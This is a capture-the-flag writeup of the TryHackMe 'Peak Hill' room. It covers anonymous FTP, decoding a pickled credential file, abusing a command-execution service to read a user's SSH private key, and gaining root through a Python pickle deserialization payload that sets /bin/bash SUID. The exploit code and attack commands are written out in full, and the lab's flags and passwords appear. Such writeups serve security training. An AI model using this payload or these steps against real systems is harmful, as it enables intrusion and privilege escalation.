---
title: TryHackMe - Peak Hill Writeup
description: My writeup on Peak Hill box.
categories:
 - tryhackme
tags: tryhackme
---

This was a really interesting box, that taught me lot of stuff!

You can find the machine there > [Peak Hill](https://tryhackme.com/room/peakhill){:target="_blank"}

As always let's start with a nmap scan.

```bash
$ ip=10.10.229.104
$ nmap -sC -sV -oN nmap.txt $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 21:13 EEST
Nmap scan report for 10.10.229.104 (10.10.229.104)
Host is up (0.16s latency).
Not shown: 997 filtered ports
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 May 15 18:37 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 04:d5:75:9d:c1:40:51:37:73:4c:42:30:38:b8:d6:df (RSA)
|   256 7f:95:1a:d7:59:2f:19:06:ea:c1:55:ec:58:35:0c:05 (ECDSA)
|_  256 a5:15:36:92:1c:aa:59:9b:8a:d8:ea:13:c9:c0:ff:b6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Really interesting, let's login into `FTP`.

```bash
$ ftp $ip
Connected to 10.10.229.104.
220 (vsFTPd 3.0.3)
Name (10.10.229.104:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 15 18:37 .
drwxr-xr-x    2 ftp      ftp          4096 May 15 18:37 ..
-rw-r--r--    1 ftp      ftp          7048 May 15 18:37 .creds
-rw-r--r--    1 ftp      ftp            17 May 15 18:37 test.txt
226 Directory send OK.
ftp> 
```

This `.creds` files seems interesting, let's download it.

```bash
ftp> get .creds
local: .creds remote: .creds
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .creds (7048 bytes).
226 Transfer complete.
7048 bytes received in 0.00 secs (1.4628 MB/s)
ftp> exit
221 Goodbye.
$ mv .creds creds
```

This `creds` file has some binary data in.

```bash
$ cat creds
1000000000000011010111010111000100000000001010000101100...
```

Let's try to decode them.

```bash
$ cat creds | perl -lpe '$_=pack"B*",$_'
�]q(X
ssh_pass15qXuq�qX	ssh_user1qXhq�qX
ssh_pass25qXr�q	X
ssh_pass20q
h�q
   X	ssh_pass7q
�qX     ssh_user0qXgq�qX
ssh_pass26qXlq�qX	ssh_pass5qX3q�qX	ssh_pass1qX1q�q�X
�qX_pass22q
ssh_pass12qX@q�qX	ssh_user2q Xeq!�q"X	ssh_user5q#Xiq$�q%X
�q'Xpass18q&h
ssh_pass27q(Xdq)�q*X	ssh_pass3q+Xkq,�q-X
ssh_pass19q.Xtq/�q0X	ssh_pass6q1Xsq2�q3X	ssh_pass9q4h�q5X
ssh_pass23q6Xwq7�q8X
ssh_pass21q9h�q:X	ssh_pass4q;h�q<X
ssh_pass14q=X0q>�q?X	ssh_user6q@XnqA�qBX	ssh_pass2qCXcqD�qEX
ssh_pass13qF�qGX
ssh_pass16qHhA�qIX	ssh_pass8qJh�qKX
ssh_pass17qLh)�qMX
ssh_pass24qNh>�qOX	ssh_user3qP�qQX	ssh_user4qRh,�qSX
�qUXpassssh_pass0qVXpqW�qXX
ssh_pass10qYh�qZe.
```

Weird.. then i checked the `tags` of this box on tryhackme platform.

![](https://i.ibb.co/1LS5NZc/Screenshot-1.png)

Python `pickle`! Few words about this module.

Pickle is used to serialize and de-serialize python objects, objects like lists, dictionaries etc.

Serialization is a way to convert data so they can be stored or transmitted over a network.

Serialize an object :

```python
import pickle

example = {'Python':3,'KDE':5,'Windows':10}

file = open('data.obj', 'wb')
pickle.dump(example,filej)
file.close()
```

De-serialize an object :

```python
import pickle   

file = open('data.obj', 'rb')
print(pickle.load(file))
```

So let's do this now with our file.

```bash
$ cat creds | perl -lpe '$_=pack"B*",$_' > creds.pickle
$ cat deserialize.py 
import pickle

file = open('creds.pickle', 'rb')
print(pickle.load(file))
$ python3 deserialize.py 
[('ssh_pass15', 'u'), ('ssh_user1', 'h'), ('ssh_pass25', 'r'), ('ssh_pass20', 'h'), ('ssh_pass7', '_'), ('ssh_user0', 'g'), ('ssh_pass26', 'l'), ('ssh_pass5', '3'), ('ssh_pass1', '1'), ('ssh_pass22', '_'), ('ssh_pass12', '@'), ('ssh_user2', 'e'), ('ssh_user5', 'i'), ('ssh_pass18', '_'), ('ssh_pass27', 'd'), ('ssh_pass3', 'k'), ('ssh_pass19', 't'), ('ssh_pass6', 's'), ('ssh_pass9', '1'), ('ssh_pass23', 'w'), ('ssh_pass21', '3'), ('ssh_pass4', 'l'), ('ssh_pass14', '0'), ('ssh_user6', 'n'), ('ssh_pass2', 'c'), ('ssh_pass13', 'r'), ('ssh_pass16', 'n'), ('ssh_pass8', '@'), ('ssh_pass17', 'd'), ('ssh_pass24', '0'), ('ssh_user3', 'r'), ('ssh_user4', 'k'), ('ssh_pass11', '_'), ('ssh_pass0', 'p'), ('ssh_pass10', '1')]
```

We have to fix this now. To place the data in an order.

```
('ssh_user0', 'g')
('ssh_user1', 'h')
('ssh_user2', 'e')
('ssh_user3', 'r')
('ssh_user4', 'k')
('ssh_user5', 'i')
('ssh_user6', 'n')

('ssh_pass0', 'p')
('ssh_pass1', '1')
('ssh_pass2', 'c')
('ssh_pass3', 'k')
('ssh_pass4', 'l'),
('ssh_pass5', '3')
('ssh_pass6', 's')
('ssh_pass7', '_')
('ssh_pass8', '@')
('ssh_pass9', '1')
('ssh_pass10', '1')
('ssh_pass11', '_')
('ssh_pass12', '@')
('ssh_pass13', 'r')
('ssh_pass14', '0')
('ssh_pass15', 'u')
('ssh_pass16', 'n')
('ssh_pass17', 'd')
('ssh_pass18', '_')
('ssh_pass19', 't')
('ssh_pass20', 'h')
('ssh_pass21', '3')
('ssh_pass22', '_')
('ssh_pass23', 'w')
('ssh_pass24', '0')
('ssh_pass25', 'r')
('ssh_pass26', 'l')
('ssh_pass27', 'd')

gherkin:p1ckl3s_@11_@r0und_th3_w0rld
```

And we're in!

```bash
$ ssh gherkin@$ip
gherkin@ubuntu-xenial:~$ 
```

We can see a `.pyc` file.

```bash
gherkin@ubuntu-xenial:~$ ls
cmd_service.pyc
```

`.pyc` file contains bytecode.

When we execute a source code (for example test.py), python first compiles it into a bytecode, bytecode is a set of instructions for a virtual machine (Python Virtual Machine - PVM).

The bytecode is sent for execution to the PVM. The PVM is an interpreter that runs the bytecode and is part of the python system.

![](https://i.imgur.com/PJME67T.png)

Let's read this `.pyc` file now using [uncompyle6](https://pypi.org/project/uncompyle6/)

`uncompyle6` -> bytecode decompiler

`decompiler` -> decompiler takes the machine code and reverts it back to the main language.

Let's download the file first.

```bash
$ scp gherkin@10.10.229.104:cmd_service.pyc .
gherkin@10.10.229.104's password: 
cmd_service.pyc                                        100% 2350    21.1KB/s   00:00    
$ uncompyle6 cmd_service.pyc > code.py
```

Code :

```python
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys, textwrap, socketserver, string, readline, threading
from time import *
import getpass, os, subprocess
username = long_to_bytes(1684630636)
password = long_to_bytes(2457564920124666544827225107428488864802762356L)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive('Username: ').strip()
        password_input = self.receive('Password: ').strip()
        print(username_input, password_input)
        if username_input == username:
            if password_input == password:
                return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send('Wrong credentials!')
            return None
        self.send('Successfully logged in!')
        while True:
            command = self.receive('Cmd: ')
            p = subprocess.Popen(command,
              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + '\n'
        self.request.sendall(string)

    def receive(self, prompt='> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():
    print('Starting server...')
    port = 7321
    host = '0.0.0.0'
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=(server.serve_forever))
    server_thread.daemon = True
    server_thread.start()
    print('Server started on ' + str(server.server_address) + '!')
    while True:
        sleep(10)


if __name__ == '__main__':
    main()
```

First of all we see 2 variables `username/password` :

```python
username = long_to_bytes(1684630636)
password = long_to_bytes(2457564920124666544827225107428488864802762356L)
```

Let's print them.

```python
>>> from Crypto.Util.number import long_to_bytes
>>> print long_to_bytes(1684630636)
dill
>>> print long_to_bytes(2457564920124666544827225107428488864802762356L)
n3v3r_@_d1ll_m0m3nt
>>> 
```

Perfect so we have some creds `dill:n3v3r_@_d1ll_m0m3nt`.

Then we can see the script opens a server on port `7321` :

```python
print('Starting server...')
port = 7321
host = '0.0.0.0'
```    

And we can have command execution :

```python
command = self.receive('Cmd: ')
p = subprocess.Popen(command,shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
```

Let's test it out!

```bash
gherkin@ubuntu-xenial:~$ nc localhost 7321
Username: dill
Password: n3v3r_@_d1ll_m0m3nt
Successfully logged in!
Cmd: whoami
dill
```

Here we go! Let's take dill's ssh private key and login in.

```bash
Cmd: cat /home/dill/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
... data ...

Cmd: ^C
gherkin@ubuntu-xenial:~$ touch /tmp/key; chmod 600 /tmp/key
gherkin@ubuntu-xenial:~$ nano /tmp/key
gherkin@ubuntu-xenial:~$ ssh -i /tmp/key dill@localhost
dill@ubuntu-xenial:~$ 
```

Perfect, now privesc to root let's check `sudo -l` :

```bash
dill@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
```

We can run this binary as root hm.. let's test what the binary does.

```bash
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: 1337
this not grow did not grow on the Peak Hill Farm! :(
```

After i tried to execute a system command.

```bash
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: whoami
failed to decode base64
```

Let's make a base64 string and submit it.

```bash
$ echo whoami | base64
d2hvYW1pCg==
```

```bash
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: d2hvYW1pCg==
this not grow did not grow on the Peak Hill Farm! :(
```

Nothing again, i found this great resource [exploiting pickle](https://root4loot.com/post/exploiting_cpickle/)

I edited the exploit a bit :

```python
import cPickle
import base64
import sys
import os

#cmd = sys.argv[1]
cmd = "chmod u+s /bin/bash"

class MMM(object):
    def __reduce__(self):
    	return (os.system, (cmd,))

print(base64.b64encode(cPickle.dumps(MMM())))
```

Let's make the `/bin/bash` suid and then execute with `-p` argument allows the shell to run with SUID privileges.

```bash
$ python exp.py
Y3Bvc2l4CnN5c3RlbQpwMQooUydjaG1vZCB1K3MgL2Jpbi9iYXNoJwpwMgp0UnAzCi4=
```

```bash
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: Y3Bvc2l4CnN5c3RlbQpwMQooUydjaG1vZCB1K3MgL2Jpbi9iYXNoJwpwMgp0UnAzCi4=
This grew to: 
0
dill@ubuntu-xenial:~$ /bin/bash -p
bash-4.3# whoami
root
```

Cool, now to read the `root` flag we have to use wildcards, bcs the name has a space.

```bash
bash-4.3# cat /home/dill/user.txt
f1e13335c47306e193212c98fc07b6a0
bash-4.3# cd /root
bash-4.3# cat *
e88f0a01135c05cf0912cf4bc335ee28
```

Awesome box, learnt ton of stuff, see you!
